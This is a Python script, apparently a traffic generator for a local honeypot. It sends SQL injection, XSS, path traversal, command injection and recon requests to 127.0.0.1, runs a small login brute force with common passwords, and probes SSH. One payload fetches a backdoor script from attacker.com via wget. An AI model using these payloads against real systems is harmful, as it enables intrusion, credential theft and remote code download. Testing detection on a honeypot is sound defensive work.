import urllib.request
import urllib.parse
import time
import random
import socket

print("[*] Starting Honeynet Sentinel Attack Generator...")

WEB_BASE = "http://127.0.0.1:8080"

# 1. Web Exploits & Scans
web_attacks = [
    # SQLi
    "/index.php?id=1%20OR%201=1--",
    "/products?cat=1%27%20UNION%20SELECT%20username,password%20FROM%20users--",
    "/login?user=admin%27%20OR%20%271%27=%271",
    "/api/v1/users?search=test%27%20OR%20sleep(5)--",
    # XSS
    "/search?q=<script>alert('XSS')</script>",
    "/profile?name=<img%20src=x%20onerror=alert(1)>",
    "/comments?msg=<svg/onload=prompt(1)>",
    # Path Traversal
    "/download?file=../../../../etc/passwd",
    "/view?doc=..%2F..%2F..%2Fetc%2Fshadow",
    "/static/../../.env",
    "/config/../../var/log/syslog",
    # Command Injection
    "/ping?host=127.0.0.1;whoami",
    "/backup?file=test.tar;wget%20http://attacker.com/backdoor.sh",
    "/system?cmd=`id`",
    # Recon / Directory Hunting
    "/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/index.php",
    "/administrator/", "/server-status", "/api/swagger.json",
    "/config.json", "/backup.sql", "/dump.sql", "/setup.php"
]

print(f"[*] Firing {len(web_attacks)} web exploit vectors...")
for path in web_attacks:
    try:
        url = f"{WEB_BASE}{path if path.startswith('/') else '/' + path}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Hydra-Scanner/v2.1)"})
        with urllib.request.urlopen(req, timeout=2) as response:
            pass
    except Exception:
        pass
    time.sleep(0.02)

print("[*] Simulating Web Login Brute Force...")
users = ["admin", "root", "administrator", "superadmin", "test"]
passwords = ["admin", "password123", "P@ssw0rd", "toor", "12345678", "qwerty"]

for u in users:
    for p in passwords[:3]:
        try:
            data = urllib.parse.urlencode({"username": u, "password": p}).encode("utf-8")
            req = urllib.request.Request(f"{WEB_BASE}/admin", data=data, headers={"User-Agent": "Botnet-Hydra-Agent"})
            with urllib.request.urlopen(req, timeout=2) as response:
                pass
        except Exception:
            pass
        time.sleep(0.01)

# 2. Simulated SSH Banner Grabs & Connections
print("[*] Simulating SSH reconnaissance against port 2222...")
for _ in range(8):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.5)
        s.connect(("127.0.0.1", 2222))
        s.sendall(b"SSH-2.0-CustomAttackScanner_1.0\r\n")
        time.sleep(0.1)
        s.close()
    except Exception:
        pass

print("[+] All attack vectors deployed successfully!")
